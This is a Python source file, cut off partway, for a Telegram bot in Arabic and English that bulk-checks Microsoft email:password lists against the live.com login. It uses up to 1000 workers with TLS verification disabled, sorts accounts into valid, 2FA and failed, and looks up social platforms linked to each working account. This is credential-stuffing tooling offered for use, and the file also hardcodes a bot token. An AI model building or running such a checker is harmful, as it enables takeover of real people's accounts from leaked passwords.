#!/usr/bin/env python3
import asyncio
import os
import re
import json
import time
import sys
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from threading import Lock, Thread
from urllib.parse import urlparse, parse_qs
from datetime import datetime
import httpx
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, constants
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# محاولة استيراد holehe لفحص المنصات
try:
    import holehe
    from holehe.modules import relevant_modules
    HOLEHE_AVAILABLE = True
except ImportError:
    HOLEHE_AVAILABLE = False
    relevant_modules = []

# محاولة استخدام uvloop لزيادة الأداء
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

# ═══════════════════ الإعدادات ═══════════════════
BOT_TOKEN = "8801512794:AAEnuE8i2XSAXJmI00OxG8IeJrGDgJC8VS0"
UPDATE_URL = "" # ضع رابط التحديث هنا إذا وجد ليقوم البوت بتحديث نفسه تلقائياً
MAX_WORKERS = 1000
BATCH_SIZE = 500
SINGLE_TIMEOUT = 30
UPDATE_INTERVAL = 0.5
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/"
OWNER_IDS = [7399113836]
BOT_CLOSED = False
USERS_DATA_FILE = "users_data.json"
CHANNEL_USERNAME = "@AbuAwwad_Rep"
TOP_PAGE_SIZE = 10
# ══════════════════════════════════════════════════════════

async_client = httpx.AsyncClient(timeout=httpx.Timeout(60.0, connect=30.0),
                                 limits=httpx.Limits(max_keepalive_connections=500, max_connections=1000),
                                 verify=False, http2=True, follow_redirects=True)
http_client = httpx.Client(timeout=httpx.Timeout(60.0, connect=30.0),
                           limits=httpx.Limits(max_keepalive_connections=500, max_connections=1000),
                           verify=False, http2=True, follow_redirects=True)

# ═══════════════════ الحروف المزخرفة ═══════════════════
BOLD_LETTERS = {
    'A': '𝐀', 'B': '𝐁', 'C': '𝐂', 'D': '𝐃', 'E': '𝐄', 'F': '𝐅', 'G': '𝐆',
    'H': '𝐇', 'I': '𝐈', 'J': '𝐉', 'K': '𝐊', 'L': '𝐋', 'M': '𝐌', 'N': '𝐍',
    'O': '𝐎', 'P': '𝐏', 'Q': '𝐐', 'R': '𝐑', 'S': '𝐒', 'T': '𝐓', 'U': '𝐔',
    'V': '𝐕', 'W': '𝐖', 'X': '𝐗', 'Y': '𝐘', 'Z': '𝐙',
    'a': '𝐚', 'b': '𝐛', 'c': '𝐜', 'd': '𝐝', 'e': '𝐞', 'f': '𝐟', 'g': '𝐠',
    'h': '𝐡', 'i': '𝐢', 'j': '𝐣', 'k': '𝐤', 'l': '𝐥', 'm': '𝐦', 'n': '𝐧',
    'o': '𝐨', 'p': '𝐩', 'q': '𝐪', 'r': '𝐫', 's': '𝐬', 't': '𝐭', 'u': '𝐮',
    'v': '𝐯', 'w': '𝐰', 'x': '𝐱', 'y': '𝐲', 'z': '𝐳'
}
def bold_text(text: str) -> str:
    return ''.join(BOLD_LETTERS.get(c, c) for c in text)

def emoji(emoji_id: str, fallback: str) -> str:
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'

# ═══════════════════ الإيموجيات ═══════════════════
E_WELCOME      = emoji("5942913575658985039", "👋")
E_MS           = emoji("5370857634440170316", "📧")
E_LINK         = emoji("5766933926429854499", "🔗")
E_ACCURACY     = emoji("5429607474174923242", "🎯")
E_DEV_LINK     = emoji("5372878077250519677", "👨‍💻")
E_FILE_SEND    = emoji("6026239398650056451", "📤")
E_SIZE         = emoji("5801152386143620268", "📏")
E_REJECT       = emoji("5318866157673918490", "❌")
E_START_CHECK  = emoji("5445279663809130789", "🚀")
E_HIT_COUNT    = emoji("5377581491641414593", "✅")
E_BAD_COUNT    = emoji("5318787220469984874", "❌")
E_2FA_COUNT    = emoji("5318889230238232615", "🔐")
E_ERR_COUNT    = emoji("5318768782175384011", "⚠️")
E_CANCEL_RED   = emoji("5870734657384877785", "⏹")
E_SORRY        = emoji("5935968647901089910", "😕")
E_INFO         = emoji("5399913388845322366", "ℹ️")
E_CHOOSE       = emoji("5942988509953398699", "👇")
E_SINGLE       = emoji("5798659067433980717", "👤")
E_NAME         = emoji("5886412370347036129", "📛")
E_EMAIL        = emoji("5967280668885913944", "📧")
E_PASSWORD     = emoji("6005570495603282482", "🔑")
E_2FA_STATUS   = emoji("5886505193180239900", "🔐")
E_DATE         = emoji("5967412305338568701", "📅")
E_PHOTO        = emoji("5775949822993371030", "🖼️")
E_NO_PHOTO     = emoji("5318787220469984874", "🚫")
E_MS_ONLY      = emoji("6255591515544882364", "💠")
E_SINGLE_CHECK = emoji("6005570495603282482", "📧")
E_SORRY_2      = emoji("5879770735999717115", "🤷")
E_WAIT         = emoji("5444989577422993015", "⏳")
E_SPEED        = emoji("5319221914110012735", "⚡")
E_RETURN       = emoji("6206505206197261313", "↩️")
E_HIT_EMOJI    = emoji("5226656353744862682", "✅")
E_2FA_EMOJI    = emoji("6005570495603282482", "🔐")
E_BAD_EMOJI    = emoji("5318787220469984874", "❌")
E_STOP         = emoji("5870734657384877785", "⏹")
E_COMMANDS     = emoji("5188161072971939376", "📋")
E_INFO_EMOJI   = emoji("5445174334031166029", "ℹ️")
E_CON_EMOJI    = emoji("5445027583588593750", "📊")
E_BAN_EMOJI    = emoji("5445092669522996408", "🔨")
E_UNBAN_EMOJI  = emoji("5319082718514915605", "🔓")
E_CON_OFF      = emoji("5318768782175384011", "🔧")
E_SENT_ALL     = emoji("5447607759421863856", "📢")
E_STATUS_ON    = emoji("5839354140261619193", "📊")
E_USER_NAME    = emoji("5886412370347036129", "📛")
E_USER_ID      = emoji("5886505193180239900", "🆔")
E_TOTAL_HITS   = emoji("5992199545151295755", "✅")
E_FIRST_JOIN   = emoji("5960714428394507968", "📅")
E_SETTINGS     = emoji("5445347129155419150", "⚙️")
E_CHANGE_LANG  = emoji("5447510826304959724", "🌐")
E_ARABIC       = emoji("5222032499328190642", "🇸🇦")
E_ENGLISH      = emoji("6026257901369168205", "🇬🇧")
E_CHANNEL      = emoji("5296369303661067030", "📢")
E_CONFIRM      = emoji("5319082718514915605", "✅")
E_PLATFORMS    = emoji("5447479640547428304", "📋")
E_TOP          = emoji("5942863513520183573", "🏆")
E_PAGE         = emoji("5445174334031166029", "📄")
E_NEXT         = emoji("6206505206197261313", "▶️")
E_PREV         = emoji("6206505206197261313", "◀️")
E_CLEAN        = emoji("5766889228705205205", "🧹")
E_QUEUE_WAIT   = emoji("5864197326318342099", "⏳")  # إيموجي الانتظار المميز

# ═══════════════════ المتغيرات الخاصة بالفحص ═══════════════════
SFTTAG_URL = "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en"

# ═══════════════════ طابور فحص الملفات (عالمي) ═══════════════════
file_queue = []          # قائمة المستخدمين المنتظرين [{user_id, lines, chat_id, waiting_msg_id}]
file_queue_lock = Lock()
currently_checking_file = None  # user_id الذي يفحص ملف حالياً

# ═══════════════════ ديكورات المالك ═══════════════════
def owner_only(func):
    async def wrapper(update, context):
        if update.effective_user.id not in OWNER_IDS:
            await update.message.reply_text(TEXTS["ar"]["owner_only"], parse_mode=constants.ParseMode.HTML)
            return
        return await func(update, context)
    return wrapper

# ═══════════════════ دوال فحص المنصات الإضافية (يدوياً) ═══════════════════
# قالب الروابط لكل منصة (يُستخدم لإنشاء روابط قابلة للنقر)
PLATFORM_URL_TEMPLATES = {
    "Twitter": "https://twitter.com/{username}",
    "Instagram": "https://instagram.com/{username}",
    "Facebook": "https://facebook.com/{username}",
    "GitHub": "https://github.com/{username}",
    "Spotify": "https://open.spotify.com/user/{username}",
    "Snapchat": "https://snapchat.com/add/{username}",
    "TikTok": "https://tiktok.com/@{username}",
    "Pinterest": "https://pinterest.com/{username}",
    "Reddit": "https://reddit.com/user/{username}",
    "Tumblr": "https://{username}.tumblr.com",
    # LinkedIn تم استبعادها لأنها تعطي نتائج إيجابية خاطئة
    "YouTube": "https://youtube.com/@{username}",
    "Medium": "https://medium.com/@{username}",
    "Twitch": "https://twitch.tv/{username}",
    "VK": "https://vk.com/{username}",
}

# دوال الفحص المحسّنة (باستخدام GET والتحقق من المحتوى)
def check_extra_platforms(email):
    """فحص المنصات الإضافية بالتوازي مع تحقق من محتوى الصفحة - محسّن"""
    username = email.split('@')[0]
    found = []
    # استخدام ThreadPoolExecutor مع عدد أقل من العاملين لتجنب الحظر
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {}
        for name, url_template in PLATFORM_URL_TEMPLATES.items():
            # استثناء LinkedIn
            if name == "LinkedIn":
                continue
            url = url_template.format(username=username)
            # نرسل طلب GET مع timeout=5 ونفحص النص
            futures[executor.submit(httpx.get, url, timeout=5, follow_redirects=True, verify=False)] = name
        for future in futures:
            name = futures[future]
            try:
                response = future.result()
                if response.status_code == 200:
                    # فحص النص للبحث عن علامات عدم وجود الحساب
                    text_lower = response.text.lower()
                    if "not found" in text_lower or "page not found" in text_lower or "sorry" in text_lower or "doesn't exist" in text_lower:
                        continue
                    found.append(name)
            except:
                pass
    return found

def sync_check_platforms(email):
    """دمج نتائج holehe + المنصات الإضافية"""
    platforms = []
    if HOLEHE_AVAILABLE:
        try:
            for module in relevant_modules:
                try:
                    result = module(email)
                    if result.get("exists"):
                        platforms.append(module.name)
                except:
                    pass
        except:
            pass
    # إضافة المنصات الإضافية (مع تجنب التكرار)
    extra = check_extra_platforms(email)
    platforms.extend(extra)
    # إزالة التكرارات
    return list(set(platforms))

# دالة لتحويل قائمة المنصات إلى روابط HTML قابلة للنقر
def format_platforms_links(email, platforms):
    if not platforms:
        return ""
    username = email.split('@')[0]
    links = []
    for name in platforms:
        template = PLATFORM_URL_TEMPLATES.get(name)
        if template:
            url = template.format(username=username)
            links.append(f'<a href="{url}">{name}</a>')
        else:
            links.append(name)
    return ", ".join(links)

# ═══════════════════ الترجمات ═══════════════════
TEXTS = {
    "ar": {
        "choose_lang": f"{E_WELCOME} <b>اختر اللغة:</b>",
        "welcome": lambda name: f"{E_WELCOME} <b>اهـلا وسـهـلا بـك {name}</b>\n\n<blockquote>{E_MS} هذا البوت عبارة عن فحص حسابات مايكروسفت\n{E_LINK} تقدر من خلاله تفحص براحتك\n{E_ACCURACY} دقة بالفحص</blockquote>\n\n{E_DEV_LINK} <b>المبرمج : ابو عواد ~ @AbuAwwad_911</b>",
        "choose_method": f"{E_CHOOSE} <b>اختر طريقة الفحص:</b>",
        "single_prompt": lambda: f"{E_SINGLE} <b>قم بأرسال بيانات الحساب بهذا النمط</b> <code>Email:pass</code>\n<blockquote>{E_MS_ONLY} تأكد من ان يكون حسابات مايكروسفت فقط</blockquote>",
        "file_prompt": f"{E_FILE_SEND} <b>ارسل لي ملف</b>\n<blockquote>يكون الصيغة .txt\n{E_SIZE} ما يتجاوز 10 ميجا بايت</blockquote>",
        "checking": f"{E_WAIT} <b>جاري الفحص ...</b>",
        "file_queue_wait": lambda: f"{E_QUEUE_WAIT} <b><blockquote>انتظر يخوي في مستخدم جاي يفحص ملف حاليا ، تم استلام ملفك اول ميخلص راح نبدأ نفحص ملفك ونرسل لك النتائج</blockquote></b>",
        "hit_single": lambda email, pwd, platforms_links: f"{E_HIT_EMOJI} <b>الحساب صحيح وكلمة المرور صحيحة ✅</b>\n\n<blockquote>{E_EMAIL} <b>الإيميل :</b> {email}\n{E_PASSWORD} <b>كلمة المرور :</b> <span class=\"tg-spoiler\">{pwd}</span>\n{E_2FA_STATUS} <b>التحقق بخطوتين :</b> {E_NO_PHOTO} لا\n\n{E_PLATFORMS} <b>المنصات المرتبطة:</b> <span class=\"tg-spoiler\">{platforms_links}</span></blockquote>",
        "hit": lambda email, pwd: f"{E_HIT_EMOJI} <b>الحساب صحيح وكلمة المرور صحيحة ✅</b>\n\n<blockquote>{E_EMAIL} <b>الإيميل :</b> {email}\n{E_PASSWORD} <b>كلمة المرور :</b> {pwd}\n{E_2FA_STATUS} <b>التحقق بخطوتين :</b> {E_NO_PHOTO} لا\n</blockquote>",
        "2fa": lambda email, pwd: f"{E_2FA_EMOJI} <b>التحقق بخطوتين مفعل!</b>\n\n<blockquote>{E_EMAIL} <b>الإيميل :</b> {email}\n{E_PASSWORD} <b>كلمة المرور :</b> {pwd}\n{E_2FA_STATUS} <b>التحقق بخطوتين :</b> {E_2FA_EMOJI}\n</blockquote>",
        "locked": f"{E_REJECT} <b>الحساب مقفل أو محظور</b>",
        "bad": f"{E_REJECT} <b>البيانات غير صحيحة (إيميل أو كلمة مرور خاطئة)</b>",
        "timeout": f"{E_ERR_COUNT} <b>استغرق الفحص وقتاً طويلاً، حاول مجدداً</b>",
        "error": f"{E_ERR_COUNT} <b>حدث خطأ أثناء الفحص</b>",
        "wrong_format": f"{E_REJECT} <b>الصيغة خطأ!</b>\nاستخدم <code>Email:pass</code>",
        "invalid_email": f"{E_REJECT} <b>إيميل غير صحيح</b>",
        "file_invalid": f"{E_REJECT} <b>لا يخوي ما نقبله</b>\n\n<blockquote>تأكد ملفك يكون بصيغة .txt\nويكون ما يتجاوز 10 ميجا بايت\nولا تنسى انه فحص مايكروسفت مو منصات ثانية يخوي</blockquote>",
        "file_empty": f"{E_REJECT} <b>الملف فارغ!</b>",
        "file_bad_format": f"{E_REJECT} <b>تنسيق الملف غير صحيح!</b>",
        "file_fail": f"{E_REJECT} <b>فشل تحميل الملف</b>",
        "choose_file_first": f"{E_REJECT} <b>الرجاء اختيار رفع ملف من القوائم أولاً.</b>",
        "check_active": f"{E_REJECT} <b>لديك فحص نشط!</b>",
        "cancel_success": f"{E_STOP} <b>تم إلغاء الفحص بنجاح</b>",
        "no_active_check": f"{E_REJECT} <b>لا يوجد فحص نشط</b>",
        "banned": f"{E_BAN_EMOJI} <b>انت محظور من استخدام البوت</b>",
        "maintenance": f"{E_CON_OFF} <b>البوت الان في وضع صيانة عد لاحقا</b>",
        "commands_title": f"{E_COMMANDS} <b>قائمة الأوامر</b>\n\n",
        "user_commands_title": f"{emoji('5188161072971939376', '📋')} <b>اوامر المستخدمين</b>",
        "user_commands": lambda: f"<code>/info</code> {E_INFO_EMOJI} استخراج جميع معلوماتك\n<code>/con</code> {E_CON_EMOJI} حالة البوت",
        "owner_commands_title": f"{emoji('5188161072971939376', '📋')} <b>اوامر المالك</b>",
        "owner_commands": lambda: f"<code>/top</code> {E_TOP} ترتيب المستخدمين حسب عدد الحسابات الصحيحة\n<code>/ban &lt;ID&gt;</code> {E_BAN_EMOJI} حظر مستخدم\n<code>/un_ban &lt;ID&gt;</code> {E_UNBAN_EMOJI} فك الحظر\n<code>/con_of</code> {E_CON_OFF} إغلاق البوت (صيانة)\n<code>/con_on</code> {E_CON_EMOJI} فتح البوت\n<code>/sent_all &lt;الرسالة&gt;</code> {E_SENT_ALL} إرسال رسالة للجميع",
        "info": lambda name, uid, hits, join: f"{E_INFO_EMOJI} <b>معلوماتك</b>\n\n{E_USER_NAME} <b>اسم المستخدم:</b> {name}\n{E_USER_ID} <b>ايدي المستخدم:</b> <code>{uid}</code>\n{E_TOTAL_HITS} <b>كم حساب صحيح:</b> <code>{hits}</code>\n{E_FIRST_JOIN} <b>متى دخلت للبوت:</b> <code>{join}</code>",
        "bot_status": lambda status: f"{E_STATUS_ON} <b>حالة البوت:</b> {status}",
        "ban_done": lambda uid: f"{E_BAN_EMOJI} <b>تم حظر المستخدم</b> <code>{uid}</code>",
        "unban_done": lambda uid: f"{E_UNBAN_EMOJI} <b>تم الغاء الحظر عن المستخدم</b> <code>{uid}</code>",
        "con_off_done": f"{E_CON_OFF} <b>تم إغلاق البوت (وضع الصيانة)</b>",
        "con_on_done": f"{E_CON_EMOJI} <b>تم فتح البوت</b>",
        "sent_all_done": lambda count: f"✅ تم إرسال الرسالة إلى {count} مستخدم.",
        "owner_only": "❌ هذا الأمر للمالكين فقط.",
        "ban_usage": "⚠️ استخدم: /ban <ID>",
        "unban_usage": "⚠️ استخدم: /un_ban <ID>",
        "sent_all_usage": "⚠️ استخدم: /sent_all <الرسالة>",
        "invalid_id": "⚠️ المعرف يجب أن يكون رقمًا.",
        "settings_title": f"{E_SETTINGS} <b>الإعدادات</b>",
        "language_changed": f"{E_CHANGE_LANG} <b>تم تغيير اللغة بنجاح</b>",
        "checking_progress": lambda hit, bad, twofa, retry, speed, pct: f"{E_START_CHECK} <b>بدينا نفحص</b>\n\n{pct}\n{E_SPEED} <b>السرعة:</b> {speed} حساب/دقيقة\n\n<blockquote>{E_HIT_EMOJI} <b>الحسابات الصحيحة :</b> <code>{hit}</code>\n{E_BAD_EMOJI} <b>الحسابات الخاطئة :</b> <code>{bad}</code>\n{E_2FA_EMOJI} <b>التحقق بخطوتين :</b> <code>{twofa}</code>\n{E_ERR_COUNT} <b>اخطاء :</b> <code>{retry}</code></blockquote>",
        "done_summary": lambda hit, twofa, bad, retry: f"<b>━━━━ اكتمل الفحص ━━━━</b>\n\n{E_HIT_EMOJI} <b>ناجح:</b> {hit}\n{E_2FA_EMOJI} <b>مصادقة ثنائية:</b> {twofa}\n{E_BAD_EMOJI} <b>فاشل:</b> {bad}\n{E_ERR_COUNT} <b>خطأ:</b> {retry}\n\n<b>شكراً لاستخدامك البوت!</b>\n{E_DEV_LINK} <b>المطور:</b> @AbuAwwad_911",
        "back_to_main": "العودة للقائمة الرئيسية",
        "check_another": "فحص حساب آخر",
        "settings": "الإعدادات",
        "change_lang": "تغير اللغة",
        "arabic": "𝐀𝐫𝐚𝐛𝐢𝐜",
        "english": "𝐄𝐧𝐠𝐥𝐢𝐬𝐡",
        "cancel_check": "إلغاء الفحص",
        "main_menu": "القائمة الرئيسية",
        "check": "فحص",
        "commands": "الاوامر",
        "single_account": "حساب واحد",
        "file": "ملف",
        "sorries": f"{E_SORRY_2} <b>نعتذر ، تواصل معي عبر الأزرار او الأوامر</b>",
        "subscribe_required": f"{E_CHANNEL} <b>يجب الاشتراك في القناة قبل البدء</b>\n\n{CHANNEL_USERNAME}",
        "not_subscribed": f"{E_REJECT} <b>أنت غير مشترك في القناة، يرجى الاشتراك ثم الضغط على تأكيد</b>",
        "subscribed_success": f"{E_CONFIRM} <b>تم التحقق من اشتراكك، مرحباً بك!</b>",
        "channel_button": "القناة",
        "confirm_button": "تأكيد",
        "file_hits": "جميع الحسابات الناجحة",
        "file_2fa": "حسابات 2FA",
        "file_bad": "حسابات فاشلة",
        "hits_file": "✅_ناجح.txt",
        "2fa_file": "🔐_مصادقة_ثنائية.txt",
        "bad_file": "❌_فاشل.txt",
        "no_platforms": "لا توجد منصات مرتبطة",
        "top_title": f"{E_TOP} <b>قائمة المتصدرين</b>\n\n",
        "top_entry": lambda rank, display, uid, hits: f"{rank}. {display} | {E_HIT_EMOJI} {hits}\n",
        "top_empty": "لا يوجد مستخدمين حتى الآن",
        "top_page": lambda current, total: f"{E_PAGE} <b>صفحة {current} من {total}</b>",
        "next": "التالي",
        "prev": "السابق",
        "cleaning_file": "يتم تنظيف الملف من الأخطاء",
    },
    "en": {
        "choose_lang": f"{E_WELCOME} <b>{bold_text('Choose Language')}:</b>",
        "welcome": lambda name: f"{E_WELCOME} <b>{bold_text('Welcome')} {name}</b>\n\n<blockquote>{E_MS} {bold_text('This bot is for checking Microsoft accounts')}\n{E_LINK} {bold_text('You can check easily')}\n{E_ACCURACY} {bold_text('High accuracy')}</blockquote>\n\n{E_DEV_LINK} <b>{bold_text('Developer')} : Abu Awwad ~ @AbuAwwad_911</b>",
        "choose_method": f"{E_CHOOSE} <b>{bold_text('Choose checking method')}:</b>",
        "single_prompt": lambda: f"{E_SINGLE} <b>{bold_text('Send account data like this')}</b> <code>Email:pass</code>\n<blockquote>{E_MS_ONLY} {bold_text('Make sure it is Microsoft accounts only')}</blockquote>",
        "file_prompt": f"{E_FILE_SEND} <b>{bold_text('Send me a file')}</b>\n<blockquote>{bold_text('Format must be .txt')}\n{E_SIZE} {bold_text('Max 10 MB')}</blockquote>",
        "checking": f"{E_WAIT} <b>{bold_text('Checking...')}</b>",
        "file_queue_wait": lambda: f"{E_QUEUE_WAIT} <b><blockquote>{bold_text('Wait, another user is currently checking a file. Your file has been received and will start checking after they finish')}</blockquote></b>",
        "hit_single": lambda email, pwd, platforms_links: f"{E_HIT_EMOJI} <b>{bold_text('Account valid')} ✅</b>\n\n<blockquote>{E_EMAIL} <b>{bold_text('Email')} :</b> {email}\n{E_PASSWORD} <b>{bold_text('Password')} :</b> <span class=\"tg-spoiler\">{pwd}</span>\n{E_2FA_STATUS} <b>{bold_text('2FA')} :</b> {E_NO_PHOTO} {bold_text('No')}\n\n{E_PLATFORMS} <b>{bold_text('Linked Platforms')}:</b> <span class=\"tg-spoiler\">{platforms_links}</span></blockquote>",
        "hit": lambda email, pwd: f"{E_HIT_EMOJI} <b>{bold_text('Account valid')} ✅</b>\n\n<blockquote>{E_EMAIL} <b>{bold_text('Email')} :</b> {email}\n{E_PASSWORD} <b>{bold_text('Password')} :</b> {pwd}\n{E_2FA_STATUS} <b>{bold_text('2FA')} :</b> {E_NO_PHOTO} {bold_text('No')}\n</blockquote>",
        "2fa": lambda email, pwd: f"{E_2FA_EMOJI} <b>{bold_text('2FA Enabled')}!</b>\n\n<blockquote>{E_EMAIL} <b>{bold_text('Email')} :</b> {email}\n{E_PASSWORD} <b>{bold_text('Password')} :</b> {pwd}\n{E_2FA_STATUS} <b>{bold_text('2FA')} :</b> {E_2FA_EMOJI}\n</blockquote>",
        "locked": f"{E_REJECT} <b>{bold_text('Account locked or banned')}</b>",
        "bad": f"{E_REJECT} <b>{bold_text('Invalid credentials (email or password wrong)')}</b>",
        "timeout": f"{E_ERR_COUNT} <b>{bold_text('Check timed out, try again')}</b>",
        "error": f"{E_ERR_COUNT} <b>{bold_text('An error occurred')}</b>",
        "wrong_format": f"{E_REJECT} <b>{bold_text('Wrong format')}!</b>\n{bold_text('Use')} <code>Email:pass</code>",
        "invalid_email": f"{E_REJECT} <b>{bold_text('Invalid email')}</b>",
        "file_invalid": f"{E_REJECT} <b>{bold_text('Invalid file')}</b>\n\n<blockquote>{bold_text('Make sure file is .txt')}\n{bold_text('Max 10 MB')}\n{bold_text('Microsoft accounts only')}</blockquote>",
        "file_empty": f"{E_REJECT} <b>{bold_text('File is empty')}!</b>",
        "file_bad_format": f"{E_REJECT} <b>{bold_text('Invalid file format')}!</b>",
        "file_fail": f"{E_REJECT} <b>{bold_text('Failed to download file')}</b>",
        "choose_file_first": f"{E_REJECT} <b>{bold_text('Please choose file upload from the menu first')}.</b>",
        "check_active": f"{E_REJECT} <b>{bold_text('You have an active check')}!</b>",
        "cancel_success": f"{E_STOP} <b>{bold_text('Check cancelled successfully')}</b>",
        "no_active_check": f"{E_REJECT} <b>{bold_text('No active check')}</b>",
        "banned": f"{E_BAN_EMOJI} <b>{bold_text('You are banned from using the bot')}</b>",
        "maintenance": f"{E_CON_OFF} <b>{bold_text('Bot is under maintenance, come back later')}</b>",
        "commands_title": f"{E_COMMANDS} <b>{bold_text('Commands List')}</b>\n\n",
        "user_commands_title": f"{emoji('5188161072971939376', '📋')} <b>{bold_text('User Commands')}</b>",
        "user_commands": lambda: f"<code>/info</code> {E_INFO_EMOJI} {bold_text('Get your info')}\n<code>/con</code> {E_CON_EMOJI} {bold_text('Bot status')}",
        "owner_commands_title": f"{emoji('5188161072971939376', '📋')} <b>{bold_text('Owner Commands')}</b>",
        "owner_commands": lambda: f"<code>/top</code> {E_TOP} {bold_text('User ranking by hits')}\n<code>/ban &lt;ID&gt;</code> {E_BAN_EMOJI} {bold_text('Ban user')}\n<code>/un_ban &lt;ID&gt;</code> {E_UNBAN_EMOJI} {bold_text('Unban user')}\n<code>/con_of</code> {E_CON_OFF} {bold_text('Close bot (maintenance)')}\n<code>/con_on</code> {E_CON_EMOJI} {bold_text('Open bot')}\n<code>/sent_all &lt;message&gt;</code> {E_SENT_ALL} {bold_text('Send message to all')}",
        "info": lambda name, uid, hits, join: f"{E_INFO_EMOJI} <b>{bold_text('Your Info')}</b>\n\n{E_USER_NAME} <b>{bold_text('Username')}:</b> {name}\n{E_USER_ID} <b>{bold_text('User ID')}:</b> <code>{uid}</code>\n{E_TOTAL_HITS} <b>{bold_text('Total Hits')}:</b> <code>{hits}</code>\n{E_FIRST_JOIN} <b>{bold_text('First joined')}:</b> <code>{join}</code>",
        "bot_status": lambda status: f"{E_STATUS_ON} <b>{bold_text('Bot Status')}:</b> {status}",
        "ban_done": lambda uid: f"{E_BAN_EMOJI} <b>{bold_text('Banned user')}</b> <code>{uid}</code>",
        "unban_done": lambda uid: f"{E_UNBAN_EMOJI} <b>{bold_text('Unbanned user')}</b> <code>{uid}</code>",
        "con_off_done": f"{E_CON_OFF} <b>{bold_text('Bot closed (maintenance mode)')}</b>",
        "con_on_done": f"{E_CON_EMOJI} <b>{bold_text('Bot opened')}</b>",
        "sent_all_done": lambda count: f"✅ {bold_text('Sent message to')} {count} {bold_text('users')}.",
        "owner_only": f"❌ {bold_text('This command is for owners only')}.",
        "ban_usage": f"⚠️ {bold_text('Use')} /ban &lt;ID&gt;",
        "unban_usage": f"⚠️ {bold_text('Use')} /un_ban &lt;ID&gt;",
        "sent_all_usage": f"⚠️ {bold_text('Use')} /sent_all &lt;message&gt;",
        "invalid_id": f"⚠️ {bold_text('ID must be a number')}.",
        "settings_title": f"{E_SETTINGS} <b>{bold_text('Settings')}</b>",
        "language_changed": f"{E_CHANGE_LANG} <b>{bold_text('Language changed successfully')}</b>",
        "checking_progress": lambda hit, bad, twofa, retry, speed, pct: f"{E_START_CHECK} <b>{bold_text('Checking started')}</b>\n\n{pct}\n{E_SPEED} <b>{bold_text('Speed')}:</b> {speed} {bold_text('acc/min')}\n\n<blockquote>{E_HIT_EMOJI} <b>{bold_text('Hits')}:</b> <code>{hit}</code>\n{E_BAD_EMOJI} <b>{bold_text('Bads')}:</b> <code>{bad}</code>\n{E_2FA_EMOJI} <b>{bold_text('2FA')}:</b> <code>{twofa}</code>\n{E_ERR_COUNT} <b>{bold_text('Errors')}:</b> <code>{retry}</code></blockquote>",
        "done_summary": lambda hit, twofa, bad, retry: f"<b>━━━━ {bold_text('Check completed')} ━━━━</b>\n\n{E_HIT_EMOJI} <b>{bold_text('Hits')}:</b> {hit}\n{E_2FA_EMOJI} <b>{bold_text('2FA')}:</b> {twofa}\n{E_BAD_EMOJI} <b>{bold_text('Bads')}:</b> {bad}\n{E_ERR_COUNT} <b>{bold_text('Errors')}:</b> {retry}\n\n<b>{bold_text('Thank you for using the bot')}</b>!\n{E_DEV_LINK} <b>{bold_text('Developer')}:</b> @AbuAwwad_911",
        "back_to_main": f"{bold_text('Back to main menu')}",
        "check_another": f"{bold_text('Check another account')}",
        "settings": f"{bold_text('Settings')}",
        "change_lang": f"{bold_text('Change language')}",
        "arabic": "𝐀𝐫𝐚𝐛𝐢𝐜",
        "english": "𝐄𝐧𝐠𝐥𝐢𝐬𝐡",
        "cancel_check": f"{bold_text('Cancel Check')}",
        "main_menu": f"{bold_text('Main Menu')}",
        "check": f"{bold_text('Check')}",
        "commands": f"{bold_text('Commands')}",
        "single_account": f"{bold_text('Single Account')}",
        "file": f"{bold_text('File')}",
        "sorries": f"{E_SORRY_2} <b>{bold_text('Sorry, use the buttons or commands')}</b>",
        "subscribe_required": f"{E_CHANNEL} <b>{bold_text('You must subscribe to the channel first')}</b>\n\n{CHANNEL_USERNAME}",
        "not_subscribed": f"{E_REJECT} <b>{bold_text('You are not subscribed, please subscribe then press confirm')}</b>",
        "subscribed_success": f"{E_CONFIRM} <b>{bold_text('Subscription verified, welcome')}</b>!",
        "channel_button": f"{bold_text('Channel')}",
        "confirm_button": f"{bold_text('Confirm')}",
        "file_hits": f"{bold_text('All successful accounts')}",
        "file_2fa": f"{bold_text('2FA accounts')}",
        "file_bad": f"{bold_text('Failed accounts')}",
        "hits_file": "✅_successful.txt",
        "2fa_file": "🔐_2fa.txt",
        "bad_file": "❌_failed.txt",
        "no_platforms": f"{bold_text('No linked platforms')}",
        "top_title": f"{E_TOP} <b>{bold_text('Leaderboard')}</b>\n\n",
        "top_entry": lambda rank, display, uid, hits: f"{rank}. {display} | {E_HIT_EMOJI} {hits}\n",
        "top_empty": f"{bold_text('No users yet')}",
        "top_page": lambda current, total: f"{E_PAGE} <b>{bold_text('Page')} {current} {bold_text('of')} {total}</b>",
        "next": f"{bold_text('Next')}",
        "prev": f"{bold_text('Previous')}",
        "cleaning_file": f"{bold_text('Cleaning the file from errors')}",
    }
}

# ═══════════════════ كلاس جلسة المستخدم ═══════════════════
class CheckerSession:
    def __init__(self, user_id):
        self.user_id = user_id
        self.hit = 0
        self.two_fa = 0
        self.bad = 0
        self.retry = 0
        self.processed = 0
        self.total = 0
        self.is_running = False
        self.cancel_event = asyncio.Event()
        self.progress_msg_id = None
        self.hits_file = None
        self.two_fa_file = None
        self.bad_file = None
        self.start_time = 0
        self.last_progress_text = ""
        self.mode = None
        self.waiting_for = None
        self.hits_buffer = []
        self.twofa_buffer = []
        self.bad_buffer = []
        self.buffer_lock = Lock()
        self.lock = Lock()
        self.buffer_size = 200

user_sessions = {}

# ═══════════════════ إدارة بيانات المستخدمين ═══════════════════
users_cache = {}
users_cache_lock = Lock()
cache_dirty = False

def load_users_data():
    global users_cache
    if os.path.exists(USERS_DATA_FILE):
        with open(USERS_DATA_FILE, "r", encoding="utf-8") as f:
            users_cache = json.load(f)
    else:
        users_cache = {}

def save_users_data():
    global users_cache, cache_dirty
    with users_cache_lock:
        with open(USERS_DATA_FILE, "w", encoding="utf-8") as f:
